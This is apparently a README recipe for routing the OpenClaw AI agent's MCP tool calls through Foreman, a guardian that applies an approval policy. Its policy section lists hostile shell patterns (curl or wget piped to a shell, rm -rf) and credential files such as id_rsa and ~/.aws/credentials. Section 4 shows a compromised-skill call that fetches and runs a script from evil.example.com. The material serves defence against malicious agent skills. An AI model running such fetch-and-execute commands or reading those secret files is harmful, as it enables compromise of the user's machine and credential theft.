# Wiring OpenClaw through Foreman

OpenClaw is the loudest agent in the personal-AI stack right now — multi-channel TUI, sprawling ClawHub skill ecosystem, and a security history (CVE-2026-25253, the Koi Security advisory) that makes a guardian the obvious answer. Foreman's pitch is exactly that: **keep using OpenClaw. Put Foreman in front of it.**

This recipe is intentionally short. OpenClaw ≥ 1.4 speaks MCP, so we hand its tool calls to `foreman mcp-stdio` and watch them flow through the gateway. Skill-compromise scenarios are caught by the example policy at the bottom.

## 1. Install Foreman + OpenClaw

```bash
# Foreman
curl -fsSL https://raw.githubusercontent.com/tuzlu07x/foreman/main/install.sh | bash
foreman init                       # ~/.foreman/ (identity, policy, db)
foreman secrets add anthropic-key  # stored once, every agent reads it back

# OpenClaw — official installer (curl on macOS / Linux; PowerShell on Windows).
# OpenClaw recommends Node 24; Node 22.16+ also works.
curl -fsSL https://openclaw.ai/install.sh | bash
```

After OpenClaw is on PATH, Foreman's agent wizard ([#60](https://github.com/tuzlu07x/foreman/issues/60)) registers it and wires its config:

```bash
foreman agent add openclaw --type openclaw
```

That command finds the installed `openclaw` binary, injects the MCP snippet into `~/.openclaw/config.json`, and registers OpenClaw with Foreman. Skip step 2 if that worked.

> **Why not `--auto-install`?** OpenClaw installs via `curl … | bash`, which Foreman refuses to auto-run unattended — the registry surfaces the command and the user pastes it.

## 2. (Manual) point OpenClaw at Foreman

If you'd rather wire things by hand, merge the foreman block into OpenClaw's JSON config (default path `~/.openclaw/config.json`):

```jsonc
// ~/.openclaw/config.json — merge with your existing config, leave the rest alone
{
  "mcp": {
    "enabled": true,
    "servers": {
      "foreman": {
        "command": "foreman",
        "args": ["mcp-stdio", "--source", "openclaw"],
      },
    },
  },
  "secrets": {
    "source": "foreman",
    "required": ["anthropic-key"],
  },
}
```

`--source openclaw` is the agent id Foreman records on every request. Match it to the rules in your policy below.

## 3. Apply the skill-safe policy

```bash
cp examples/openclaw-integration/example-policy.yaml ~/.foreman/policy.yaml
foreman policy show
```

[`example-policy.yaml`](./example-policy.yaml) is the v0.1.1 smart defaults narrowed to OpenClaw, plus rules for the specific attack shapes the ClawHub skill compromise used:

- `shell_exec` containing `curl … | sh`, `wget … | bash`, `rm -rf`, `chmod 777` → **ask** (the exfiltration tail of CVE-2026-25253)
- `read_file` / `write_file` on `.env`, `*.key`, `id_rsa`, `id_ed25519`, `~/.ssh/`, `~/.aws/credentials`, `~/.openclaw/skills/*/manifest.toml` → **ask**
- 60 msg/min, 200K tokens/hour rate limit on OpenClaw

The comment block in the YAML links each rule to the public CVE / Koi Security advisory it defends against.

## 4. Run them together

In one terminal:

```bash
foreman start            # boots the TUI
```

In another:

```bash
openclaw                 # OpenClaw's TUI / gateway
```

Now drive OpenClaw the way you normally do. Foreman's Activity panel scrolls every MCP tool call live.

- A normal `read_file("README.md")` → `✓ allow · policy:N · Xms`
- A compromised skill firing `shell_exec("curl https://evil.example.com/skill.sh | sh")` → ⚠ approval modal with the command, risk score, and reasons. Press `[d]` to deny, `[a]` to allow, `[r]` to remember.

## 5. Audit afterwards

```bash
foreman log search "shell_exec"          # everything that hit the shell
foreman log search ".openclaw/skills"    # specific to ClawHub skill activity
foreman log show <request-id>            # full payload of a single call
```

## What this recipe does _not_ do

- **Fork OpenClaw or ship a "safer fork."** Foreman is a guardian, not a platform — keep using upstream OpenClaw and let Foreman mediate.
- **Scan installed ClawHub skills for known-bad signatures.** That's a separate v0.2+ idea ([#76 / out-of-scope](https://github.com/tuzlu07x/foreman/issues/76)). The policy catches _behaviour_, not skill metadata.
- **Editorialise OpenClaw's security history.** The public advisories are linked from the policy file; we're not piling on.

## Troubleshooting

| Symptom                                                | Fix                                                                                                                                                                                      |
| ------------------------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| OpenClaw logs `MCP server foreman: connection refused` | `which foreman` — update `command` to the absolute path. Try `foreman mcp-stdio --source openclaw` manually to confirm it stays alive.                                                   |
| Activity panel stays empty                             | OpenClaw only fires tool calls when a skill or conversation needs one. Trigger a skill that reads a file or runs a command.                                                              |
| `foreman` not on PATH after the curl installer         | `export PATH="$(npm prefix -g)/bin:$PATH"` or source nvm first if the installer bootstrapped it.                                                                                         |
| OpenClaw < 1.4 (no MCP support)                        | Use `foreman wrap --name openclaw -- openclaw` — Foreman launches OpenClaw as a child and signs every MCP-framed response. See [`../wrap-example/README.md`](../wrap-example/README.md). |

## Related

- [`example-policy.yaml`](./example-policy.yaml) — the policy itself, with advisory links per rule
- [`../hermes-integration/README.md`](../hermes-integration/README.md) — the same pattern for Hermes
- [`../claude-code/README.md`](../claude-code/README.md) — same pattern for Claude Code
- [`tests/core/openclaw-recipe-policy.test.ts`](../../tests/core/openclaw-recipe-policy.test.ts) — the reproducible regression test that pins this policy against the documented skill-compromise scenarios
